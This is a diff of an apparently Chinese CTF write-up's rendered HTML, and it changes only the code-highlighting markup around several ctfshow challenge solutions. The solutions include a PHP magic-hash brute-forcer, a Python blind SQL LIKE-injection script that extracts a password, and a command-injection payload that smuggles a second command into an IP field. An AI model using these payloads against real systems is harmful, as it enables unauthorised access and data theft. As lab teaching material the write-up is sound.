-<span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">999999</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
-    <span class="nv">$x2</span><span class="o">=</span><span class="nx">hash</span><span class="p">(</span><span class="s1">&#39;md2&#39;</span><span class="p">,</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span> <span class="s1">&#39;0e&#39;</span><span class="o">.</span><span class="nv">$j</span><span class="o">.</span><span class="s1">&#39;48399&#39;</span><span class="p">));</span>
-    <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$x2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">===</span><span class="s1">&#39;0e&#39;</span>  <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$x2</span><span class="p">)){</span>
-        <span class="k">break</span><span class="p">;</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">print</span><span class="p">(</span><span class="s1">&#39;b=0e&#39;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s1">&#39;024452&amp;c=0e&#39;</span><span class="o">.</span><span class="nv">$j</span><span class="o">.</span><span class="s1">&#39;48399&#39;</span><span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="mi">99999</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$x1</span><span class="o">=</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span> <span class="s1">&#39;0e&#39;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s1">&#39;024452&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$x1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">===</span><span class="s1">&#39;0e&#39;</span>  <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$x1</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span><span class="p">(</span><span class="nv">$j</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$j</span><span class="o">&lt;</span><span class="mi">999999</span><span class="p">;</span><span class="nv">$j</span><span class="o">++</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$x2</span><span class="o">=</span><span class="nx">hash</span><span class="p">(</span><span class="s1">&#39;md2&#39;</span><span class="p">,</span><span class="nx">hash</span><span class="p">(</span><span class="s2">&#34;md2&#34;</span><span class="p">,</span> <span class="s1">&#39;0e&#39;</span><span class="o">.</span><span class="nv">$j</span><span class="o">.</span><span class="s1">&#39;48399&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$x2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">===</span><span class="s1">&#39;0e&#39;</span>  <span class="k">and</span> <span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$x2</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">print</span><span class="p">(</span><span class="s1">&#39;b=0e&#39;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s1">&#39;024452&amp;c=0e&#39;</span><span class="o">.</span><span class="nv">$j</span><span class="o">.</span><span class="s1">&#39;48399&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p> ​ ​ ​ ​ ​ 分析脚本发现我寻找字符串的思路有点偏复杂了，<code>0e数字</code>结构字符串会被php认为是<strong>科学计数法</strong>，因此会通过<code>is_numeric函数</code>的验证，这样的思路比筛选0e后面是否是数字要简单得多。</p>
 <p>爆破出来的结果：</p>
@@ -543,9 +543,9 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> 
-<span class="nv">$flag</span><span class="o">=</span><span class="s2">&#34;flag in /fl0g.txt&#34;</span><span class="p">;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> 
+</span></span><span class="line"><span class="cl"><span class="nv">$flag</span><span class="o">=</span><span class="s2">&#34;flag in /fl0g.txt&#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>直接给出了flag的地址，接下来就需要我们去读取文件内容。</p>
 <p>先随便POST个<code>http://ctfshow.com</code>，回显</p>
@@ -554,8 +554,8 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="nx">scheme</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">http</span> <span class="p">[</span><span class="nx">host</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">ctfshow</span><span class="o">.</span><span class="nx">com</span> <span class="p">)</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">Array</span> <span class="p">(</span> <span class="p">[</span><span class="nx">scheme</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">http</span> <span class="p">[</span><span class="nx">host</span><span class="p">]</span> <span class="o">=&gt;</span> <span class="nx">ctfshow</span><span class="o">.</span><span class="nx">com</span> <span class="p">)</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>host名应该满足<code>preg_match('/ctfshow\.com$/',$host['host'])</code>的条件，但是没有回显<code>'差点点就成功了！'</code>，我也不清楚是什么原因，暂且叫做玄学吧。</p>
 <p>接下来碰到一个问题，不在web服务目录<code>/var/www/html</code>的文件怎么通过web访问到呢？</p>
@@ -578,9 +578,9 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="c">&lt;!-- username yu22x --&gt;</span>
-<span class="c">&lt;!-- SELECT * FROM users where username like binary(&#39;$username&#39;) and password like binary(&#39;$password&#39;)--&gt;</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- username yu22x --&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- SELECT * FROM users where username like binary(&#39;$username&#39;) and password like binary(&#39;$password&#39;)--&gt;</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>fuzz一下，<code>' &quot; union select sleep ^ # % () - \ ,</code>都被过滤了，但是由于这里使用的是<code>like</code>模糊匹配，可以单字符匹配，我们可以先试探出password的总长度。</p>
 <p>先来学习一下like的匹配规则：</p>
@@ -629,28 +629,28 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 </span><span class="lnt">21
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
-<span class="kn">import</span> <span class="nn">string</span>
-
-<span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://83fea8dc-883c-49f1-9991-a1291ef09b08.chall.ctf.show/login.php&#39;</span>
-<span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
-<span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
-<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
-    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
-        <span class="n">payload</span> <span class="o">=</span> <span class="n">passwd</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s2">&#34;_&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="p">(</span><span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
-        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
-            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;yu22x&#39;</span><span class="p">,</span>
-            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">payload</span>
-        <span class="p">}</span>
-        <span class="n">res</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
-        <span class="k">if</span> <span class="s1">&#39;wrong&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
-            <span class="n">passwd</span> <span class="o">+=</span> <span class="n">i</span>
-            <span class="nb">print</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
-            <span class="k">break</span>
-    <span class="k">if</span> <span class="n">length</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">passwd</span><span class="p">):</span>
-        <span class="k">break</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://83fea8dc-883c-49f1-9991-a1291ef09b08.chall.ctf.show/login.php&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">letters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span>
+</span></span><span class="line"><span class="cl"><span class="n">passwd</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">letters</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">passwd</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s2">&#34;_&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">32</span> <span class="o">-</span> <span class="p">(</span><span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="s1">&#39;yu22x&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">payload</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;wrong&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">passwd</span> <span class="o">+=</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">length</span> <span class="o">&gt;=</span> <span class="nb">len</span><span class="p">(</span><span class="n">passwd</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>注出password：<code>67815b0c009ee970fe4014abaa3Fa6A0</code>，登录。</p>
 <p>输入IP查看连接状态，应该是RCE，fuzz发现只能用大写字母、数字和<code>{}~_;:?.$#</code>这些字符。</p>
@@ -713,8 +713,8 @@ xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">127.0.0.1<span class="p">;</span><span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">14</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">5</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span> ????.??? <span class="c1"># nl flag.php</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">127.0.0.1<span class="p">;</span><span class="si">${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">14</span><span class="p">:</span><span class="nv">1</span><span class="si">}${</span><span class="nv">PATH</span><span class="p">:</span><span class="nv">5</span><span class="p">:</span><span class="nv">1</span><span class="si">}</span> ????.??? <span class="c1"># nl flag.php</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div>
             </div>
